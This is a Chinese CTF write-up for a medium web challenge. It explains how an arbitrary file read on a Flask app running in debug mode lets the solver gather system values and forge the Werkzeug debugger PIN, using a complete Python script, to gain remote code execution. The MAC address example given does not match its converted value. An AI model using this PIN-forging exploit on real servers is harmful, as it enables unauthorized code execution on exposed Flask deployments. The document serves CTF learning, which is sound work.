# Help Newnew Find Flag

**Author:** Rieß(Xp0int)

**Difficulty:** Medium

**Category:** Web

## 题目描述

你能帮 newnew 找到 flag 吗？

## 题目解析

**暴露端口：`80`**

题目存在任意文件读取，当试图读取 `/flag` 的时候会报错，此处说明 debug 打开

flask debug 为 True，且存在任意文件读取漏洞，则可以 pin 码伪造

1. `/etc/passwd`，获取运行此 app.py 的用户名: `newnew`

2. app.py 的绝对路径，可从报错信息得到

3. `/sys/class/net/eth0/address`

mac 地址的十进制数 `9a:1c:85:c0:4c:04` 通过 python 命令行来转换成十进制 `print(int('9a1c85c04c04',16))`

`02:42:c0:a8:0f:02` => `2485723336450`

4. 对于非 docker 机每一个机器都会有自已唯一的 id，linux 的 id 一般存放在 `/etc/machine-id` 或 `/proc/sys/kernel/random/boot_id`，有的系统没有这两个文件。对于 docker 机则读取 `/proc/self/cgroup`，其中第一行的 `/docker/` 字符串后面的内容作为机器的 id

`/proc/sys/kernel/random/boot_id` => `ceb43f9d-2c5e-4bce-b351-551ddfe48b78`

此题读不出 `/proc/self/cgroup`，那读 `/proc/sys/kernel/random/boot_id` 就行

```python
import hashlib
from itertools import chain
probably_public_bits = [
    'newnew',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.8/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '2485723336450',# str(uuid.getnode()),  /sys/class/net/ens33/address
    'ceb43f9d-2c5e-4bce-b351-551ddfe48b78'# get_machine_id(), /etc/machine-id
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")

cookie_name = f"__wzd{h.hexdigest()[:20]}"

# If we need to generate a pin we salt it a bit more so that we don't
# end up with the same value and generate out 9 digits
num = None
if num is None:
    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]

# Format the pincode in groups of digits for easier remembering if
# we don't have a result yet.
rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num

print(rv)
```

计算出 pin 码，在 flask 报错界面填入就可以 rce

![](https://s1.ax1x.com/2023/03/22/ppdgsSS.png)
